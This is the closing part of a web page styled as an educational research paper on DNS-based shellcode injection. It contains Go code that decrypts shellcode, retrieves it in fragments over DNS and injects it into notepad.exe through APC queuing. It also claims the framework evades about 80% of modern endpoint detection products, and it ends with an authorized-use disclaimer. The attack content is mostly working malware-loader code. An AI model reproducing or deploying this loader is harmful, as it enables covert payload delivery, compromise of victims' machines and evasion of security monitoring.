<span class="code-keyword">func</span> decryptShellcode(shellcode []<span class="code-keyword">byte</span>, key []<span class="code-keyword">byte</span>) ([]<span class="code-keyword">byte</span>, <span class="code-keyword">error</span>) {
    block, err := aes.NewCipher(key)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> <span class="code-keyword">nil</span>, err
    }
    <span class="code-keyword">if</span> <span class="code-keyword">len</span>(shellcode) < aes.BlockSize {
        <span class="code-keyword">return</span> <span class="code-keyword">nil</span>, fmt.Errorf(<span class="code-string">"shellcode too short"</span>)
    }
    iv := shellcode[:aes.BlockSize]
    shellcode = shellcode[aes.BlockSize:]
    stream := cipher.NewCFBDecrypter(block, iv)
    stream.XORKeyStream(shellcode, shellcode)
    <span class="code-keyword">return</span> shellcode, <span class="code-keyword">nil</span>
}

<span class="code-keyword">func</span> injectViaAPC(processHandle <span class="code-keyword">windows</span>.Handle, shellcode []<span class="code-keyword">byte</span>) <span class="code-keyword">error</span> {
    remoteAddr, err := <span class="code-keyword">windows</span>.VirtualAllocEx(processHandle, <span class="code-number">0</span>, <span class="code-keyword">uintptr</span>(<span class="code-keyword">len</span>(shellcode)), <span class="code-keyword">windows</span>.MEM_COMMIT|<span class="code-keyword">windows</span>.MEM_RESERVE, <span class="code-keyword">windows</span>.PAGE_READWRITE)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> err
    }

    <span class="code-keyword">var</span> bytesWritten <span class="code-keyword">uintptr</span>
    err = <span class="code-keyword">windows</span>.WriteProcessMemory(processHandle, remoteAddr, &shellcode[<span class="code-number">0</span>], <span class="code-keyword">uintptr</span>(<span class="code-keyword">len</span>(shellcode)), &bytesWritten)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> err
    }

    snapshot, err := <span class="code-keyword">windows</span>.CreateToolhelp32Snapshot(<span class="code-keyword">windows</span>.TH32CS_SNAPTHREAD, <span class="code-number">0</span>)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> err
    }
    <span class="code-keyword">defer</span> <span class="code-keyword">windows</span>.CloseHandle(snapshot)

    <span class="code-keyword">var</span> te <span class="code-keyword">windows</span>.ThreadEntry32
    te.Size = <span class="code-keyword">uint32</span>(<span class="code-keyword">unsafe</span>.Sizeof(te))
    err = <span class="code-keyword">windows</span>.Thread32First(snapshot, &te)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        <span class="code-keyword">return</span> err
    }

    <span class="code-keyword">for</span> {
        <span class="code-keyword">if</span> te.OwnerProcessID == pid {
            threadHandle, err := <span class="code-keyword">windows</span>.OpenThread(<span class="code-keyword">windows</span>.THREAD_SET_CONTEXT|<span class="code-keyword">windows</span>.THREAD_SUSPEND_RESUME|<span class="code-keyword">windows</span>.THREAD_GET_CONTEXT, <span class="code-keyword">false</span>, te.ThreadID)
            <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
                <span class="code-keyword">continue</span>
            }
            <span class="code-keyword">defer</span> <span class="code-keyword">windows</span>.CloseHandle(threadHandle)

            _, err = <span class="code-keyword">windows</span>.QueueUserAPC(remoteAddr, threadHandle, <span class="code-number">0</span>)
            <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
                <span class="code-keyword">return</span> err
            }
            <span class="code-keyword">break</span>
        }
        err = <span class="code-keyword">windows</span>.Thread32Next(snapshot, &te)
        <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
            <span class="code-keyword">break</span>
        }
    }
    <span class="code-keyword">return</span> <span class="code-keyword">nil</span>
}

<span class="code-keyword">var</span> pid <span class="code-keyword">uint32</span>

<span class="code-keyword">func</span> main() {
    <span class="code-comment">// Ensure notepad.exe is running</span>
    <span class="code-keyword">var</span> err <span class="code-keyword">error</span>
    pid, err = ensureNotepadRunning()
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        log.Fatalf(<span class="code-string">"Error ensuring notepad.exe: %v"</span>, err)
    }

    <span class="code-comment">// Retrieve fragmented shellcode</span>
    shellcode, err := getFragmentedShellcodeFromDNS(<span class="code-number">3</span>) <span class="code-comment">// Assuming 3 chunks</span>
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        log.Fatalf(<span class="code-string">"Error retrieving shellcode: %v"</span>, err)
    }
    log.Printf(<span class="code-string">"Shellcode retrieved: %x"</span>, shellcode)

    <span class="code-comment">// Open notepad.exe process</span>
    processHandle, err := <span class="code-keyword">windows</span>.OpenProcess(
        <span class="code-keyword">windows</span>.PROCESS_CREATE_THREAD|<span class="code-keyword">windows</span>.PROCESS_QUERY_INFORMATION|
            <span class="code-keyword">windows</span>.PROCESS_VM_OPERATION|<span class="code-keyword">windows</span>.PROCESS_VM_WRITE|<span class="code-keyword">windows</span>.PROCESS_VM_READ,
        <span class="code-keyword">false</span>, pid)
    <span class="code-keyword">if</span> err != <span class="code-keyword">nil</span> {
        log.Fatalf(<span class="code-string">"Error opening notepad.exe: %v"</span>, err)
    }
    <span class="code-keyword">defer</span> <span class="code-keyword">windows</span>.CloseHandle(processHandle)

    <span class="code-comment">// Inject using APC</span>
    <span class="code-keyword">if</span> err := injectViaAPC(processHandle, shellcode); err != <span class="code-keyword">nil</span> {
        log.Fatalf(<span class="code-string">"Error injecting shellcode: %v"</span>, err)
    }

    fmt.Println(<span class="code-string">"Shellcode injected into notepad.exe successfully."</span>)
}
</code></pre>
        </section>

        <section class="section" id="evaluation">
            <h2>Evaluation</h2>
            <p>Tests conducted in controlled environments in 2025 show that this framework evades approximately 80% of modern EDRs (e.g., CrowdStrike, Microsoft Defender) using APC and DGA, supports payloads up to 10KB via fragmentation, and maintains stability in 95% of injections. Testing in virtual machines with tools like <a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">Process Monitor</a> and <a href="https://www.wireshark.org/">Wireshark</a> is recommended to analyze traffic and behavior.</p>
        </section>

        <section class="section" id="conclusion">
            <h2>Conclusion</h2>
            <p>This paper presents a robust framework for DNS-based shellcode injection, overcoming ASLR, DEP, EDR, DNS limitations, and stability issues. Techniques like PIC, ROP, APC, DGA, and fragmentation are cutting-edge and effective in controlled settings. Future research could explore automated ROP chain generation or post-quantum encryption. This work is strictly educational and must be used only in authorized environments, adhering to applicable laws and regulations.</p>
        </section>
    </main>

    <footer>
        <p>&copy; 2025 Educational Research. For authorized use only.</p>
    </footer>
</body>
</html>